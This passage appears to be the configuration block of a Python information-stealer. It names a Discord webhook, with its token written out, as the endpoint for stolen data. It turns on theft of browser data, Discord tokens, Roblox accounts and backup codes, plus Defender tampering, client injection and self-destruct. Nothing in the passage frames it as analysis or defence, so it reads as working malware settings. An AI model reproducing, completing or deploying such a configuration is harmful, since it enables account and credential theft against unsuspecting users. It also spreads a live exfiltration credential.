...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1103089165773590588/P-OBmOyFz5BnMSLE5BC0jsOZrA6EkNxFK1nRF8EW-0M_G8QtTJcu_3valQ18EB45Yi4T', 'ping': False, 'pingtype': 'Here', 'error': True, 'startup': False, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': False, 'wifi': False, 'killprotector': True, 'antidebug_vm': False, 'discord': True, 'anti_spam': True, 'self_destruct': True}
